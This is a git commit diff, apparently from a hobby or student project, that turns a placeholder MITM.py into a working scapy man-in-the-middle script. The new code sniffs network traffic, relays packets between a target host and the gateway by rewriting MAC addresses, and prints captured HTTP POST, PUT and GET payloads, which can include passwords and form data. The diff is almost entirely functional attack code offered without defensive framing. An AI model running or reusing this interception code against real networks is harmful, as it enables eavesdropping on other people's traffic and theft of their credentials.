3c9d207915ba1039523c0c712973e7a4d4c6506c
Brunotti12 <128841706+Brunotti12@users.noreply.github.com>
2024-11-08 01:57:19 +0100

    Update MITM.py

--- MITM.py
+++ MITM.py
@@ -1,14 +1,42 @@
-import time
+from scapy.all import *
+from sniffer import get_target_ip
+from router_ip_mac import get_gateway_ip, get_mac
+
+target_ip = get_target_ip()
+target_mac = get_mac(target_ip)
+gateway_ip = get_gateway_ip()
+gateway_mac = get_mac(gateway_ip)
+my_mac = open(f"/sys/class/net/eth0/address").read().strip()
+
+
+def tcp_packet(packet):
+    if packet.haslayer("Raw"):
+        raw_data = packet["Raw"].load
+        if b"POST" in raw_data:
+            print("\n\nCaptured POST data: ", raw_data, "\n\n")
+        elif b"PUT" in raw_data:
+            print("\nCaptured PUT data:, ", raw_data)
+        elif b"GET" in raw_data:
+            print("\nCaptured GET data: ", raw_data)
+
+def forward_packet(packet):
+    if packet.haslayer(Ether) and packet.haslayer(IP):
+        if packet.haslayer(TCP) and packet[TCP].dport == 80:
+            tcp_packet(packet)
+
+        if packet[Ether].src == target_mac and packet[IP].dst == gateway_ip and packet[Ether].dst == my_mac:
+            packet[Ether].dst = gateway_mac
+            sendp(packet)
+        elif packet[Ether].src == gateway_mac and packet[IP].dst == target_ip and packet[Ether].dst == my_mac:
+            packet[Ether].dst = target_mac
+            sendp(packet)
 
 
 
 def MITM_attack():
     try:
-        #setup code
-        while True:
-            #code die zich moet blijven herhalen
-            time.sleep(2)
+        print("Starting MITM attack. . .")
+        sniff(0, prn=forward_packet, store=0)
     except KeyboardInterrupt:
-        #code die alles hersteld (als deze nodig is)
         print("\nMITM attack terminated")
     return None
